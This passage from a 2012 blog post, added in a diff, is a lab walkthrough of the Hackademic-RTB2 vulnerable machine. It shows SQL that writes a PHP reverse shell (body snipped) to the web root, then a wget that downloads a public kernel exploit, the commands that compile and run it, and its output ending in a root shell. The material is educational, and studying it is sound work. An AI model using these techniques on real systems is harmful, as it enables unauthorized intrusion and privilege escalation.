+</span><span class='line'>        allow from all
+</span><span class='line'>    &lt;/Directory&gt;
+</span><span class='line'>
+</span><span class='line'>    ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
+</span><span class='line'>    &lt;Directory "/usr/lib/cgi-bin"&gt;
+</span><span class='line'>        AllowOverride None
+</span><span class='line'>        Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
+</span><span class='line'>        Order allow,deny
+</span><span class='line'>        Allow from all
+</span><span class='line'>    &lt;/Directory&gt;
+</span><span class='line'>
+</span><span class='line'>    ErrorLog /var/log/apache2/error.log
+</span><span class='line'>
+</span><span class='line'>    # Possible values include: debug, info, notice, warn, error, crit,
+</span><span class='line'>    # alert, emerg.
+</span><span class='line'>    LogLevel warn
+</span><span class='line'>
+</span><span class='line'>    CustomLog /var/log/apache2/access.log combined
+</span><span class='line'>
+</span><span class='line'>    Alias /doc/ "/usr/share/doc/"
+</span><span class='line'>    &lt;Directory "/usr/share/doc/"&gt;
+</span><span class='line'>        Options Indexes MultiViews FollowSymLinks
+</span><span class='line'>        AllowOverride None
+</span><span class='line'>        Order deny,allow
+</span><span class='line'>        Deny from all
+</span><span class='line'>        Allow from 127.0.0.0/255.0.0.0 ::1/128
+</span><span class='line'>    &lt;/Directory&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;/VirtualHost&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we can execute commands on the backend:</p>
+
+<p><img src="/images/posts/2012/hrt2_6.jpg"></p>
+
+<p>As you can see, most everything in <code>/var/www/</code> is owned by root, which would explain our inability to write anywhere.  The ownership of <code>configuration.php</code> would also explain our ability to retrieve it.</p>
+
+<p>Another interesting bit was found in user p0wnbox&rsquo;s download&rsquo;s folder.  knockknock-0.7.tar.gz.</p>
+
+<p><img src="/images/posts/2012/hrt2_7.jpg"></p>
+
+<p>We can&rsquo;t yet read the configuration file (we&rsquo;re www-data), but it appears that a port knocker is running.  This is likely why I couldn&rsquo;t immediately connect to the :666 Joomla site.  Interesting.</p>
+
+<p>Let&rsquo;s drop a reverse shell onto the box the same way we did the command access.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>CREATE TABLE bdshell(
+</span><span class='line'>Sauce TEXT
+</span><span class='line'>);
+</span><span class='line'>
+</span><span class='line'>INSERT INTO bdshell
+</span><span class='line'>VALUES(INSERT INTO shell
+</span><span class='line'>VALUES(
+</span><span class='line'>[SNIP]
+</span><span class='line'>);
+</span><span class='line'>
+</span><span class='line'>SELECT *
+</span><span class='line'>INTO DUMPFILE '/var/www/bd.php'
+</span><span class='line'>FROM bdshell;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The snipped area from the insert is just a <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">PHP reverse shell</a>, stripped of all apostrophes.  We can now connect to it like so:</p>
+
+<p><img src="/images/posts/2012/hrt2_7.jpg"></p>
+
+<p>Now we&rsquo;ve got a shell on the box as www-data.  A little enumeration&hellip;</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ whoami
+</span><span class='line'>www-data
+</span><span class='line'>$ uname -a
+</span><span class='line'>Linux HackademicRTB2 2.6.32-24-generic #39-Ubuntu SMP Wed Jul 28 06:07:29 UTC 2010 i686 GNU/Linux</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Huzzah,<a href="http://threatpost.com/en_us/blogs/linux-kernel-flaw-coughs-root-rights-102110">privilege</a> escalation time.  Funny enough, exactly the exploit we used for RTB1.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ cd /tmp
+</span><span class='line'>$ ls
+</span><span class='line'>orbit-gdm
+</span><span class='line'>pulse-PKdhtXMmr18n
+</span><span class='line'>$ wget www.vsecurity.com/download/tools/linux-rds-exploit.c
+</span><span class='line'>--2012-11-19 06:01:56--  http://www.vsecurity.com/download/tools/linux-rds-exploit.c
+</span><span class='line'>Resolving www.vsecurity.com... 209.67.252.12
+</span><span class='line'>Connecting to www.vsecurity.com|209.67.252.12|:80... connected.
+</span><span class='line'>HTTP request sent, awaiting response... 200 OK
+</span><span class='line'>Length: 6435 (6.3K) [text/x-c]
+</span><span class='line'>Saving to: `linux-rds-exploit.c'
+</span><span class='line'>
+</span><span class='line'>     0K ......                                                100% 83.6K=0.08s
+</span><span class='line'>
+</span><span class='line'>2012-11-19 06:01:56 (83.6 KB/s) - `linux-rds-exploit.c' saved [6435/6435]
+</span><span class='line'>
+</span><span class='line'>$ ls
+</span><span class='line'>linux-rds-exploit.c
+</span><span class='line'>orbit-gdm
+</span><span class='line'>pulse-PKdhtXMmr18n
+</span><span class='line'>$ gcc linux-rds-exploit.c -o sploit
+</span><span class='line'>$ ./sploit
+</span><span class='line'>[*] Linux kernel &gt;= 2.6.30 RDS socket exploit
+</span><span class='line'>[*] by Dan Rosenberg
+</span><span class='line'>[*] Resolving kernel addresses...
+</span><span class='line'> [+] Resolved rds_proto_ops to 0xe099e980
+</span><span class='line'> [+] Resolved rds_ioctl to 0xe0998090
+</span><span class='line'> [+] Resolved commit_creds to 0xc016dd80
+</span><span class='line'> [+] Resolved prepare_kernel_cred to 0xc016e0c0
+</span><span class='line'>[*] Overwriting function pointer...
+</span><span class='line'>[*] Linux kernel &gt;= 2.6.30 RDS socket exploit
+</span><span class='line'>[*] by Dan Rosenberg
+</span><span class='line'>[*] Resolving kernel addresses...
+</span><span class='line'> [+] Resolved rds_proto_ops to 0xe099e980
+</span><span class='line'> [+] Resolved rds_ioctl to 0xe0998090
+</span><span class='line'> [+] Resolved commit_creds to 0xc016dd80
+</span><span class='line'> [+] Resolved prepare_kernel_cred to 0xc016e0c0
+</span><span class='line'>[*] Overwriting function pointer...
+</span><span class='line'>[*] Triggering payload...
+</span><span class='line'>[*] Restoring function pointer...
+</span><span class='line'>$ whoami
+</span><span class='line'>root
+</span><span class='line'>$ cd /root
+</span><span class='line'>$ ls
+</span><span class='line'>Desktop
+</span><span class='line'>Key.txt</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Bam.  Answering a question I had before,</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat /etc/knockd.conf
+</span><span class='line'>[options]
+</span><span class='line'>    UseSyslog
+</span><span class='line'>
+</span><span class='line'>[openHTTPD]
+</span><span class='line'>    sequence    = 7000,8000,9000
+</span><span class='line'>    seq_timeout = 5
+</span><span class='line'>    command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 666 -j ACCEPT
+</span><span class='line'>    tcpflags    = syn
+</span><span class='line'>
+</span><span class='line'>[closeHTTPD]
+</span><span class='line'>    sequence    = 9000,8000,7000
+</span><span class='line'>    seq_timeout = 5
+</span><span class='line'>    command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 666 -j ACCEPT
+</span><span class='line'>    tcpflags    = syn</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So we&rsquo;d need to hit 7000, then 8000, then finally 9000 to get accepted.  Fortunately a simple nmap of the box will enable this rule, so it really isn&rsquo;t a very impressive port knocking tool.</p>
+
+<p>Overall a fun disc.  And if there&rsquo;s any interest, I may pick up the Joomla attack tool and continue development of it.</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Bryan Alexander</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-11-18T01:24:24-07:00" pubdate data-updated="true">Nov 18<span>th</span>, 2012</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/hackademic/'>hackademic</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>, <a class='category' href='/blog/categories/walkthrough/'>walkthrough</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://hatRiot.github.io/blog/2012/11/18/solving-hackademic-rtb2/" data-via="" data-counturl="http://hatRiot.github.io/blog/2012/11/18/solving-hackademic-rtb2/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2012/11/13/solving-hackademic-rtb1/" title="Previous Post: Solving Hackademic-RTB1">&laquo; Solving Hackademic-RTB1</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2012/12/30/lshell-0.9.15-pathing-vulnerability/" title="Next Post: lshell 0.9.15 pathing vulnerability">lshell 0.9.15 pathing vulnerability &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/05/13/rce-in-browser-exploitation-framework-beef/">rce in browser exploitation framework (BeEF)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/04/02/lfi-to-stager-payload-in-coldfusion/">LFI to shell in Coldfusion 6-10</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/03/26/ibm-tealeaf-cx-remote-os-command-injection-lfi/">IBM Tealeaf CX (v8 Release 8) Remote OS Command Injection / LFI</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/03/10/meterpreter-shell-upgrades-using-powershell/">meterpreter shell upgrades using powershell</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/03/02/introduction/">introduction</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - Bryan Alexander -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a> | Themed with <a href="https://github.com/lucaslew/whitespace">Whitespace</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
